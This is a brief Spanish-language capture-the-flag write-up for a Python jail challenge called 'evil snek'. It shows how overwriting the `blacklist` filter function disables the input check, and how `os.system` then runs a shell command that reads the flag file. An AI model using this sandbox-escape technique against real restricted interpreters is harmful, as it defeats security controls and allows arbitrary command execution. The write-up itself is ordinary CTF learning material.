# evil snek

Si hacemos `exec("blacklist=function")` suplantamos a `blacklist` en `if not blacklist(inp):`

```py
> blacklist=callable
> __import__('os').system("cat flag.txt")
wwf{s1lly_sn3k_1_just_0verwr1t3_y0ur_funct10n}
>
```

`wwf{s1lly_sn3k_1_just_0verwr1t3_y0ur_funct10n}`
